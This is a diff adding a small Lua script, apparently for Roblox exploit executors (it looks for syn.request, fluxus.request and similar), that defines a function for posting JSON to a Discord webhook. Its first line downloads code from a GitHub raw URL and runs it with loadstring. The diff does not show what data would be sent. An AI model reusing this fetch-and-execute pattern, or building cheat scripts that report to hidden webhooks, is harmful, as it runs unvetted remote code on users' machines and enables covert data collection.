@@ -1,0 +1,31 @@
+local webhookUrl = loadstring(game:HttpGet("https://raw.githubusercontent.com/Tropxzz/SweatDestroyer/main/WebHookUrl"))()
+
+-- Determine the HTTP request function
+local HTTPRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+-- Create a function to send the webhook to Discord
+local function sendDiscordWebhook(content)
+    -- Check if the HTTP request function is available
+    if HTTPRequest then
+        -- Construct the request payload
+        local payload = {
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(content)
+        }
+        
+        -- Send the request
+        local success, response = pcall(HTTPRequest, payload)
+        if success then
+            print("Discord webhook sent successfully!")
+        else
+            warn("Failed to send Discord webhook:", response)
+        end
+    else
+        warn("HTTP request function not found. Discord webhook cannot be sent.")
+    end
+end
+
